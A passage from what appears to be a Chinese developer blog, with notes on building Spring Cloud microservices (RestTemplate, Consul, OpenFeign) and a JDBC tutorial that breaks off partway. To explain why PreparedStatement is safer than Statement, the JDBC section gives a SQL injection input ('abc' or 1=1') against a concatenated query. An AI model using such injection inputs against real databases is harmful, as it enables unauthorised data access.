<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="attr">package.name</span>=<span class="string">com.fu</span></span><br><span class="line"><span class="comment"># mysql8.0</span></span><br><span class="line"><span class="attr">jdbc.driverClass</span> = <span class="string">com.mysql.cj.jdbc.Driver</span></span><br><span class="line"><span class="attr">jdbc.url</span>= <span class="string">jdbc:mysql://localhost:3306/db2024?characterEncoding=utf8&amp;useSSL=false&amp;serverTimezone=GMT%2B8&amp;rewriteBatchedStatements=true&amp;allowPublicKeyRetrieval=true</span></span><br><span class="line"><span class="attr">jdbc.user</span> = <span class="string">15767</span></span><br><span class="line"><span class="attr">jdbc.password</span> = <span class="string">password</span></span><br></pre></td></tr></table></figure>

<p>此后在侧边栏Maven中点击插件-mybatis-generator即可主动生成。</p>
<h3 id="支付微服务（Base工程示例）"><a href="#支付微服务（Base工程示例）" class="headerlink" title="支付微服务（Base工程示例）"></a>支付微服务（Base工程示例）</h3><p>整体上按正常的项目编写步骤，编写entities、controller、mapper、service等</p>
<h4 id="一个基本的微服务项目构建流程"><a href="#一个基本的微服务项目构建流程" class="headerlink" title="一个基本的微服务项目构建流程"></a>一个基本的微服务项目构建流程</h4><p>本节代码</p>
<p>创建Module &#x3D;》修改POM &#x3D;》编写yaml &#x3D;》主启动类 &#x3D;》业务类</p>
<p>业务类中直接将generator中生成的xml、entities、mapper文件直接复制过来，mapper.xml文件需要置于resources目录下。一个好的工程应当做到如下优化：</p>
<ul>
<li>如果使用swagger，需要编写配置类，同时为实体类和controller添加如<code>@Tag</code>，<code>@Schema</code>，<code>@Operation</code>等注解说明</li>
<li>为了避免直接暴露领域模型或数据库实体类，降低系统各层之间的耦合度，防止敏感信息被意外传递到客户端，只传输必要的数据。需要为实体类设计一个与前端交互的DTO类</li>
<li>为了方便前端读取数据，应当设计一个全局统一返回格式类详情，一般包括：<ul>
<li>code：状态值，建议和message一起使用枚举类（包含举值、构造方法、遍历 详情）表示。</li>
<li>message：本次接口调用结果描述</li>
<li>data：本次返回的数据</li>
<li>timestamp：可能有时间戳，接口的调用时间</li>
<li>操作成功函数、其他操作结果函数</li>
</ul>
</li>
<li>为了减少try-catch等代码，规范返回数据，应当有全局异常接入返回的标准格式.</li>
</ul>
<h4 id="全局异常处理类设计"><a href="#全局异常处理类设计" class="headerlink" title="全局异常处理类设计"></a>全局异常处理类设计</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 全局异常处理器类，用于捕获并处理应用程序中的异常。</span></span><br><span class="line"><span class="comment"> * 通过 &#123;<span class="doctag">@code</span> <span class="doctag">@RestControllerAdvice</span>&#125; 注解，将该类定义为一个全局异常处理控制器，</span></span><br><span class="line"><span class="comment"> * 并适用于整个应用程序的 RESTful 接口。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Slf4j</span> <span class="comment">// 使用 Lombok 提供的注解，自动生成日志对象 log，方便记录日志信息。</span></span><br><span class="line"><span class="meta">@RestControllerAdvice</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GlobalExceptionHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 捕获 RuntimeException 类型的异常，并返回统一的错误响应结果。</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> e 异常对象，包含异常的具体信息。</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 返回封装后的 ResultData 对象，表示异常处理的结果。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@ExceptionHandler(RuntimeException.class)</span> <span class="comment">// 指定该方法用于处理 RuntimeException 及其子类异常。</span></span><br><span class="line">    <span class="meta">@ResponseStatus(HttpStatus.INTERNAL_SERVER_ERROR)</span> <span class="comment">// 响应 HTTP 状态码 500（内部服务器错误）。</span></span><br><span class="line">    <span class="keyword">public</span> ResultData&lt;String&gt; <span class="title function_">exception</span><span class="params">(Exception e)</span> &#123;</span><br><span class="line">        <span class="comment">// 记录异常信息到日志中，使用 error 级别记录详细信息和堆栈跟踪。</span></span><br><span class="line">        log.error(<span class="string">&quot;全局异常信息：&#123;&#125;&quot;</span>, e.getMessage(), e);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 返回封装后的错误结果，调用 ResultData 的 fail 方法，</span></span><br><span class="line">        <span class="comment">// 设置错误码为 RC500（通常表示系统内部错误），并将异常消息作为提示信息返回。</span></span><br><span class="line">        <span class="keyword">return</span> ResultData.fail(ReturnCodeEnum.RC500.getCode(), e.getMessage());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>注释说明</strong>：</p>
<ol>
<li>**<code>@Slf4j</code>**：Lombok 提供的注解，用于自动生成 <code>log</code> 对象，简化日志记录代码。</li>
<li>**<code>@RestControllerAdvice</code>**：Spring 提供的注解，声明该类是一个全局异常处理控制器，专门用于处理 RESTful 接口中的异常。</li>
<li>**<code>@ExceptionHandler(RuntimeException.class)</code>**：指定该方法用于捕获 <code>RuntimeException</code> 类型及其子类的异常。</li>
<li>**<code>@ResponseStatus(HttpStatus.INTERNAL_SERVER_ERROR)</code>**：设置当该方法被触发时，HTTP 响应的状态码为 500（内部服务器错误）。</li>
<li>**<code>log.error</code>**：记录异常的详细信息，包括异常消息和堆栈跟踪，便于后续排查问题。</li>
<li>**<code>ResultData.fail</code>**：调用 <code>ResultData</code> 的 <code>fail</code> 方法，返回封装后的错误结果，包含错误码和错误消息。</li>
</ol>
<h3 id="订单微服务"><a href="#订单微服务" class="headerlink" title="订单微服务"></a>订单微服务</h3><p>本节代码</p>
<p>编写原则：</p>
<ul>
<li>服务的调用者的访问URI应该在提供者接口URI基础上添加，如<code>/consumer/pay/add</code>和<code>/pay/add</code></li>
</ul>
<h4 id="RestTemplate"><a href="#RestTemplate" class="headerlink" title="RestTemplate"></a>RestTemplate</h4><p><a href="https://docs.spring.io/spring-framework/docs/6.0.11/javadoc-api/org/springframework/web/client/RestTemplate.html">官网介绍</a></p>
<p><strong>RestTemplate</strong> 是 Spring 框架提供的一个用于与 RESTful 服务进行交互的客户端工具类。<code>RestTemplate</code> 是一个同步的 HTTP 客户端，用于发送 HTTP 请求（如 GET、POST、PUT、DELETE 等）并处理响应。在微服务架构中，服务间通信常通过 <code>RestTemplate</code> 实现。它可以：</p>
<ul>
<li>调用外部 RESTful API 或微服务接口。</li>
<li>支持多种数据格式（如 JSON、XML）的请求和响应转换。</li>
<li>提供便捷的方法封装 HTTP 请求逻辑。</li>
</ul>
<p>使用restTemplate访问restful接口非常的简单粗暴。(url, requestMap, ResponseBean.class)这三个参数分别代表 REST请求地址、请求参数、HTTP响应转换被转换成的对象类型，常用API如下：</p>
<table>
<thead>
<tr>
<th><strong>方法名称</strong></th>
<th><strong>功能描述</strong></th>
<th><strong>返回值类型</strong></th>
</tr>
</thead>
<tbody><tr>
<td><code>exchange()</code></td>
<td>发送任意类型的 HTTP 请求（GET、POST、PUT、DELETE 等），并允许自定义请求头和请求体。</td>
<td><code>ResponseEntity&lt;T&gt;</code></td>
</tr>
<tr>
<td><code>execute()</code></td>
<td>执行 HTTP 请求，并允许通过回调函数处理响应内容，适合更复杂的场景。</td>
<td>用户定义的类型</td>
</tr>
<tr>
<td><code>headForHeaders()</code></td>
<td>发送 HEAD 请求，用于获取目标资源的响应头信息。</td>
<td><code>HttpHeaders</code></td>
</tr>
<tr>
<td><code>put()</code></td>
<td>发送 PUT 请求，通常用于更新资源，不返回响应体。</td>
<td><code>void</code></td>
</tr>
<tr>
<td><code>delete()</code></td>
<td>发送 DELETE 请求，用于删除资源，不返回响应体。</td>
<td><code>void</code></td>
</tr>
<tr>
<td><code>optionsForAllow()</code></td>
<td>发送 OPTIONS 请求，用于获取目标资源支持的 HTTP 方法列表。</td>
<td><code>Set&lt;HttpMethod&gt;</code></td>
</tr>
</tbody></table>
<p><img src="https://raw.githubusercontent.com/Fushiye/BlogPicture/main/img_blog/20250221220131.png"></p>
<ul>
<li><code>*Entity()</code>：返回结果为ResponseEntity对象，包含响应体中一些重要信息如响应头、状态码、响应体等。</li>
<li><code>*Object()</code>：返回结果为响应体中数据转化成的对象，可以理解为JSON</li>
<li>上述为<code>GET</code>请求方法对应API，<code>POST</code>请求方法对应API只需要将get换为post即可。</li>
</ul>
<h5 id="配置类"><a href="#配置类" class="headerlink" title="配置类"></a>配置类</h5><p>调用RestTemplate中的API可以提供在程序中new一个对象的方式，但在Spring项目中更常用配置类的方式将对象放到容器中：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RestTemplateConfig</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> RestTemplate <span class="title function_">restTemplate</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">RestTemplate</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OrderController</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">PaymentSrv_URL</span> <span class="operator">=</span> <span class="string">&quot;http://localhost:8001&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">public</span> RestTemplate restTemplate;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(value = &quot;/consumer/pay/add&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> ResultData <span class="title function_">addOrder</span><span class="params">(PayDTO payDTO)</span>&#123;</span><br><span class="line">       <span class="keyword">return</span> restTemplate.postForObject(PaymentSrv_URL+<span class="string">&quot;/pay/add&quot;</span>,payDTO,ResultData.class);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h3 id="工程重构"><a href="#工程重构" class="headerlink" title="工程重构"></a>工程重构</h3><p>在各个微服务项目中可能存在重复的代码，如entities、全局结果类、全局异常类等，这些代码可以提取到同一个模块中，此模块对外暴露通用的组件&#x2F;API&#x2F;接口&#x2F;工具类等，供其他服务调用。此模块无需运行，因此不是一个独立的服务，也无需yaml配置文件，相当于一个工具模块。</p>
<p>对工具模块执行（生命周期中的）<code>maven clean</code>+<code>maven install</code>操作，清除其他模块的重复部分，然后在其他服务模块的POM文件的<code>dependencys</code>中引入当前工具模块。</p>
<p>如：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fu<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>cloud-api-commons<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><h3 id="编程错误-问题"><a href="#编程错误-问题" class="headerlink" title="编程错误&#x2F;问题"></a>编程错误&#x2F;问题</h3><h4 id="工程重构-1"><a href="#工程重构-1" class="headerlink" title="工程重构"></a>工程重构</h4><h5 id="工程重构Maven-install报错-The-packaging-for-this-project-did-not-assign-a-file-to-the-build-artifact"><a href="#工程重构Maven-install报错-The-packaging-for-this-project-did-not-assign-a-file-to-the-build-artifact" class="headerlink" title="工程重构Maven install报错 The packaging for this project did not assign a file to the build artifact"></a>工程重构Maven install报错 The packaging for this project did not assign a file to the build artifact</h5><p>需要使用maven生命周期的工具而不是插件中的工具</p>
<h4 id="Concul"><a href="#Concul" class="headerlink" title="Concul"></a>Concul</h4><h5 id="Standard-Commons-Logging-discovery-in-action-with-spring-jcl-please-remove-commons-logging-jar-from-classpath-in-order-to-avoid-potential-conflicts"><a href="#Standard-Commons-Logging-discovery-in-action-with-spring-jcl-please-remove-commons-logging-jar-from-classpath-in-order-to-avoid-potential-conflicts" class="headerlink" title="Standard Commons Logging discovery in action with spring-jcl: please remove commons-logging.jar from classpath in order to avoid potential conflicts"></a>Standard Commons Logging discovery in action with spring-jcl: please remove commons-logging.jar from classpath in order to avoid potential conflicts</h5><p>修改依赖导入：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-consul-discovery<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-logging<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-logging<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h5 id="Caused-by-java-net-UnknownHostException-cloud-payment-service"><a href="#Caused-by-java-net-UnknownHostException-cloud-payment-service" class="headerlink" title="Caused by: java.net.UnknownHostException: cloud-payment-service"></a>Caused by: java.net.UnknownHostException: cloud-payment-service</h5><p>【问题原因】</p>
<p>consul原生支持负载均衡，默认每个微服务都是集群状态，RestTemplate发送请求时会不清楚具体的对象。</p>
<p>【解决方案】</p>
<p>修改RestTemplateConfig，使用注解<code>@LoadBalanced</code>开启负载均衡</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RestTemplateConfig</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="meta">@LoadBalanced</span></span><br><span class="line">    <span class="keyword">public</span> RestTemplate <span class="title function_">restTemplate</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">RestTemplate</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="Openfeign"><a href="#Openfeign" class="headerlink" title="Openfeign"></a>Openfeign</h3><h4 id="A-component-required-a-bean-of-type-‘com-fu-apis-PayFeignApi’-that-could-not-be-found-Action-Consider-defining-a-bean-of-type-‘com-fu-apis-PayFeignApi’-in-your-configuration"><a href="#A-component-required-a-bean-of-type-‘com-fu-apis-PayFeignApi’-that-could-not-be-found-Action-Consider-defining-a-bean-of-type-‘com-fu-apis-PayFeignApi’-in-your-configuration" class="headerlink" title="A component required a bean of type ‘com.fu.apis.PayFeignApi’ that could not be found.  Action: Consider defining a bean of type ‘com.fu.apis.PayFeignApi’ in your configuration."></a>A component required a bean of type ‘com.fu.apis.PayFeignApi’ that could not be found.  Action: Consider defining a bean of type ‘com.fu.apis.PayFeignApi’ in your configuration.</h4><p>【问题概述】：  </p>
<p>服务调用者启动时出现上述报错，无法找到对应API</p>
<p>【产生原因】：<br><code>@EnableFeignClients</code> 注解的作用是启用 Feign 客户端功能，并扫描指定范围内的接口以将其注册为 Spring 管理的 Bean。如果不指定 <code>basePackages</code> 参数，默认情况下，Spring Boot 会基于主应用程序类（即带有 <code>@SpringBootApplication</code> 注解的类）所在的包及其子包进行扫描。如果 Feign 接口位于其他模块或不在主应用程序类的包结构中，则不会被自动扫描到。</p>
<p>【解决方案】：<br>使用 <code>@EnableFeignClients(basePackages = &quot;com.fu.apis&quot;)</code> 明确指定 Feign 接口所在的包路径。</p>
<h3 id="sentinel-openfein"><a href="#sentinel-openfein" class="headerlink" title="sentinel+openfein"></a>sentinel+openfein</h3><h4 id="整合后服务调用者模块无法启动"><a href="#整合后服务调用者模块无法启动" class="headerlink" title="整合后服务调用者模块无法启动"></a>整合后服务调用者模块无法启动</h4><blockquote>
<p>Caused by: org.springframework.beans.factory.BeanCreationException: Error creating bean with name ‘com.fu.apis.PayFeignSentinelApi’: FactoryBean threw exception on object creation</p>
<p>Caused by: java.lang.IllegalStateException: Method PayFeignSentinelApi#getPayByOrderNo(String) not annotated with HTTP method type (ex. GET, POST)</p>
</blockquote>
<p>原因：springboot和springcloudalibaba版本兼容出错，修改</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--        &lt;spring.boot.version&gt;3.2.0&lt;/spring.boot.version&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        &lt;spring.cloud.version&gt;2023.0.0&lt;/spring.cloud.version&gt;--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">spring.boot.version</span>&gt;</span>3.0.9<span class="tag">&lt;/<span class="name">spring.boot.version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">spring.cloud.version</span>&gt;</span>2022.0.2<span class="tag">&lt;/<span class="name">spring.cloud.version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">spring.cloud.alibaba.version</span>&gt;</span>2022.0.0.0-RC2<span class="tag">&lt;/<span class="name">spring.cloud.alibaba.version</span>&gt;</span></span><br></pre></td></tr></table></figure>





<h3 id="知识点总结"><a href="#知识点总结" class="headerlink" title="知识点总结"></a>知识点总结</h3><h4 id="loadbalancer"><a href="#loadbalancer" class="headerlink" title="loadbalancer"></a>loadbalancer</h4><p>依赖<code>spring-cloud-starter-consul-discovery</code>中实际已经包含了<code>spring-cloud-starter-loadbalancer</code>，且如果consul默认情况下没有使用注解<code>@LoadBalanced</code>开启负载均衡会无法使用，所以使用consul时此环节无需任何操作即可自动实现负载均衡！</p>
<h4 id="OpenFeign"><a href="#OpenFeign" class="headerlink" title="OpenFeign"></a>OpenFeign</h4><p>接口提取服务提供者的对外暴露方法时，最重要的是访问的URL必须和服务提供者的Controller中的一致，抽象方法名可以不一致，但为了方便查看，一般取同名。同时，方法中从配置消息中读取的参数可以省略。</p>
<p>=============	【<strong>本文终结</strong>】	=============</p>
]]></content>
      <categories>
        <category>Java</category>
        <category>框架与工具</category>
      </categories>
      <tags>
        <tag>微服务</tag>
      </tags>
  </entry>
  <entry>
    <title>Java-JDBC-Note</title>
    <url>/2024/08/09/Java-JDBC-Note/</url>
    <content><![CDATA[<p>JDBC（Java Database  Connectivity，Java数据库连接）是Java编程语言中用于执行SQL语句的API。它为Java应用程序提供了一种统一的方法来访问各种关系型数据库，包括MySQL、Oracle、SQL Server等。通过使用JDBC，开发者可以编写与数据库无关的应用程序代码，只需更改驱动程序即可连接到不同的数据库。</p>
<p>基本步骤：</p>
<ol>
<li>注册驱动【依赖的驱动类，进行安装】（jdk</li>
<li>获取连接【Connection建立连接】</li>
<li>创建发送SQL语句对象【Connection创建发送SQL语句的Statement】</li>
<li>发送SQL语句，并获取返回结果【Statement 发送sql语句到数据库并且取得返回结果】</li>
<li>结果集解析【结果集解析，将查询结果解析出来】</li>
<li>资源关闭【释放ResultSet、Statement 、Connection】</li>
</ol>
<h2 id="基础-核心API"><a href="#基础-核心API" class="headerlink" title="基础-核心API"></a>基础-核心API</h2><p>示例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">       <span class="comment">//1.注册驱动</span></span><br><span class="line">       Class.forName(<span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);</span><br><span class="line">   <span class="comment">//  DriverManager.registerDriver(new Driver());</span></span><br><span class="line"></span><br><span class="line">       <span class="comment">//2.获取连接对象</span></span><br><span class="line">       <span class="comment">// 固定写法jdbc:mysql://数据库ip地址:端口/具体数据库名称</span></span><br><span class="line">       <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://localhost:3306/atguigudb&quot;</span>;</span><br><span class="line">       <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> <span class="string">&quot;root&quot;</span>;</span><br><span class="line">       <span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> <span class="string">&quot;SillyBoy&quot;</span>;</span><br><span class="line">       <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> DriverManager.getConnection(url, username, password);</span><br><span class="line"></span><br><span class="line">       <span class="comment">//3.获取执行SQL语句的对象</span></span><br><span class="line">       <span class="type">Statement</span> <span class="variable">statement</span> <span class="operator">=</span> connection.createStatement();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       <span class="comment">//4.编写SQL语句，并执行，接受返回的结果集</span></span><br><span class="line">       <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;SELECT employee_id,last_name,salary FROM employees&quot;</span>;</span><br><span class="line">       <span class="type">ResultSet</span> <span class="variable">resultSet</span> <span class="operator">=</span> statement.executeQuery(sql);</span><br><span class="line"></span><br><span class="line">       <span class="comment">//5.处理结果：遍历resultSet结果集</span></span><br><span class="line">       <span class="keyword">while</span>(resultSet.next())&#123;</span><br><span class="line">           <span class="type">int</span> <span class="variable">empId</span> <span class="operator">=</span> resultSet.getInt(<span class="string">&quot;employee_id&quot;</span>);</span><br><span class="line">           <span class="type">String</span> <span class="variable">empName</span> <span class="operator">=</span> resultSet.getString(<span class="string">&quot;last_name&quot;</span>);</span><br><span class="line">           <span class="type">double</span> <span class="variable">empSalary</span> <span class="operator">=</span> resultSet.getDouble(<span class="string">&quot;salary&quot;</span>);</span><br><span class="line">          <span class="comment">// int empAge = resultSet.getInt(&quot;emp_age&quot;);</span></span><br><span class="line">           System.out.println(empId+<span class="string">&quot;\t&quot;</span>+empName+<span class="string">&quot;\t&quot;</span>+empSalary+<span class="string">&quot;\t&quot;</span>);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="comment">//6.释放资源（先开后关原则）</span></span><br><span class="line">       resultSet.close();</span><br><span class="line">       statement.close();</span><br><span class="line">       connection.close();</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<h3 id="注册驱动："><a href="#注册驱动：" class="headerlink" title="注册驱动："></a>注册驱动：</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class.forName(<span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li>在 Java 中，当使用 JDBC（Java Database Connectivity）连接数据库时，需要加载数据库特定的驱动程序，以便与数据库进行通信。加载驱动程序的目的是为了注册驱动程序，使得<code>JDBC API</code>能够识别并与特定的数据库进行交互。</li>
<li>从JDK6开始，不再需要显式地调用 <code>Class.forName()</code> 来加载<code>JDBC</code>驱动程序，只要在类路径中集成了对应的jar文件，会自动在初始化时注册驱动程序:在mysql.connector-j.jar&#x2F;META_INF&#x2F;services文件夹下的java.sql.Driver（名字与Driver实现的接口同名）文件中写明了接口实现类的全路径名，从而使得java可以自动注册驱动</li>
</ul>
<h3 id="Connection"><a href="#Connection" class="headerlink" title="Connection"></a>Connection</h3><p>Connection接口是JDBC API的重要接口，用于建立与数据库的通信通道。换而言之，Connection对象不为空，则代表一次数据库连接。</p>
<ul>
<li>在建立连接时，需要指定数据库URL、用户名、密码参数。<ul>
<li>URL：jdbc:mysql:&#x2F;&#x2F;localhost:3306&#x2F;atguigu</li>
<li>jdbc:mysql:&#x2F;&#x2F;IP地址:端口号&#x2F;数据库名称?参数键值对1&amp;参数键值对2<br>特别的，当连接本机数据库时，可以使用<code>jdbc:mysql:///数据库名称</code></li>
</ul>
</li>
<li><code>Connection</code> 接口还负责管理事务，<code>Connection</code> 接口提供了 <code>commit</code> 和 <code>rollback</code> 方法，用于提交事务和回滚事务。</li>
<li>可以创建 <code>Statement</code> 对象，用于执行 SQL 语句并与数据库进行交互。</li>
<li>在使用JDBC技术时，必须要先获取Connection对象，在使用完毕后，要释放资源，避免资源占用浪费及泄漏。</li>
</ul>
<h3 id="statement"><a href="#statement" class="headerlink" title="statement"></a>statement</h3><p><code>Statement</code> 接口用于执行 SQL 语句并与数据库进行交互。它是 JDBC API 中的一个重要接口。通过 <code>Statement</code> 对象，可以向数据库发送 SQL 语句并获取执行结果。</p>
<ul>
<li>结果可以是一个或多个结果。<ul>
<li>增删改：受影响行数单个结果。</li>
<li>查询：单行单列、多行多列、单行多列等结果。</li>
</ul>
</li>
<li><strong>但是Statement接口在执行SQL语句时，会产生SQL注入攻击问题:</strong><ul>
<li>当使用 <code>Statement</code> 执行动态构建的 SQL 查询时，往往需要将查询条件与 SQL 语句拼接在一起，直接将参数和SQL语句一并生成，让SQL的查询条件始终为true得到结果。</li>
</ul>
</li>
</ul>
<p><strong>Statement产生的SQL注入攻击</strong>，见下文示例</p>
<h3 id="PreparedStatement"><a href="#PreparedStatement" class="headerlink" title="PreparedStatement"></a>PreparedStatement</h3><p><code>PreparedStatement</code>是 <code>Statement</code> 接口的子接口，用于执行<code>预编译</code>的 SQL 查询，作用如下：</p>
<ul>
<li>预编译SQL语句：在创建PreparedStatement时，就会预编译SQL语句，也就是SQL语句已经固定。</li>
<li>防止SQL注入：<code>PreparedStatement</code> 支持参数化查询，将数据作为参数传递到SQL语句中，采用?占位符的方式，将传入的参数用一对单引号包裹起来’’，无论传递什么都作为值。有效防止传入关键字或值导致SQL注入问题。</li>
<li>性能提升：PreparedStatement是预编译SQL语句，同一SQL语句多次执行的情况下，可以复用，不必每次重新编译和解析。</li>
</ul>
<p>后续的学习我们都是基于PreparedStatement进行实现，更安全、效率更高！</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">System.out.println(<span class="string">&quot;输入员工姓名&quot;</span>);</span><br><span class="line"><span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line"><span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> scanner.nextLine();</span><br><span class="line"><span class="comment">//3.获取执行SQL语句的对象</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 原方法 存在sql注入问题</span></span><br><span class="line"><span class="comment">// Statement statement = connection.createStatement();</span></span><br><span class="line"><span class="comment">// 4.执行sql语句，接收返回结果</span></span><br><span class="line"><span class="comment">// 如果name = abc&#x27; or 1=1 将可以查询一切数据</span></span><br><span class="line"><span class="comment">// String sql = &quot;SELECT employee_id,last_name,salary FROM employees where last_name = &#x27;&quot;+name+&quot;&#x27;&quot;;</span></span><br><span class="line"><span class="comment">// ResultSet resultSet = statement.executeQuery(sql);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 现在：使用prepareStatement避免sql注入</span></span><br><span class="line"><span class="type">PreparedStatement</span> <span class="variable">preparedStatement</span> <span class="operator">=</span> connection.prepareStatement(<span class="string">&quot;SELECT employee_id,last_name,salary FROM employees where last_name = ?&quot;</span>);</span><br><span class="line"><span class="comment">// 4.为?占位符赋值，并执行sql语句，接收返回结果</span></span><br><span class="line">preparedStatement.setString(<span class="number">1</span>,name);</span><br><span class="line"><span class="type">ResultSet</span> <span class="variable">resultSet</span> <span class="operator">=</span> preparedStatement.executeQuery();</span><br><span class="line"><span class="comment">// 即使name = abc&#x27; or 1=1,符号&#x27;也会被转义为普通字符</span></span><br></pre></td></tr></table></figure>


<h3 id="ResultSet"><a href="#ResultSet" class="headerlink" title="ResultSet"></a>ResultSet</h3><p><code>ResultSet</code>是 JDBC API 中的一个接口，用于表示从数据库中<code>执行查询语句所返回的结果集</code>。它提供了一种用于遍历和访问查询结果的方式。当执行一个查询并获取到ResultSet时，结果集实际上已经包含了所有的数据行和列名，但是这些数据行的访问是通过一个游标控制的。游标初始时并不指向任何一行，它位于结果集的最前面，即第一行之前。当第一次调用.next()方法时，游标会向前移动到第一行，并且如果第一行存在，.next()方法会返回true，表示已经成功定位到了第一行。此时，就可以使用<code>.getXxx(int columnIndex)</code>或<code>.getXxx(String columnName)</code>等方法来获取当前行（即游标所在行）的数据了。因此，**.next()方法至少执行一次**</p>
<ul>
<li>遍历结果：ResultSet可以使用 <code>next()</code> 方法将游标移动到结果集的下一行，逐行遍历数据库查询的结果，返回值为boolean类型，true代表有下一行结果，false则代表没有。</li>
<li>获取单列结果：可以通过getXxx的方法获取单列的数据，该方法为重载方法，支持索引和列名进行获取。</li>
</ul>
<h3 id="基于PreparedStatement实现CRUD"><a href="#基于PreparedStatement实现CRUD" class="headerlink" title="基于PreparedStatement实现CRUD"></a>基于PreparedStatement实现CRUD</h3><table>
<thead>
<tr>
